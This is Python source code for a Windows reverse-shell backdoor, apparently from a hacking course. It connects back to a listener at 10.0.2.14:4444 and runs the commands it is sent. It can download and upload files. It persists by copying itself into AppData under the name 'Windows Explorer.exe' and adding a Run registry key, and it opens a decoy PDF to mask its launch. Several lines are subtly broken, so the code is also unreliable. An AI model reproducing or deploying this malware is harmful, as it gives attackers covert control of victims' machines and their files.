import socket, subprocess, json, os, base64, sys, shutil

class Backdoor:

    def __init__(self,ip,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port)) #connect method take tuple variable that's why there are 2 brackets

    def reliable_send(self, data):
        json_data = json.dump(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self,command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to" + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())   

    def write_file(self, path, content):
        with open(path, "wb") as file:
            base64.b64decode(file.write(content))
            return "[+]Upload successful"

    def run(self):
        while True:
            command = self.reliable_recieve() #To recieve data
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0]=="download":
                    command_result = self.read_file(command[1])
                elif command[0]=="upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                return "[-]Error during program execution...."
            self.reliable_send(command_result)
        
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        shutil.copyfile(sys.executable)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ "'+evil_file_location+'"', shell=True)

file_name=sys.MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor=Backdoor("10.0.2.14",4444)
    my_backdoor.run()
except Exception:
    sys.exit()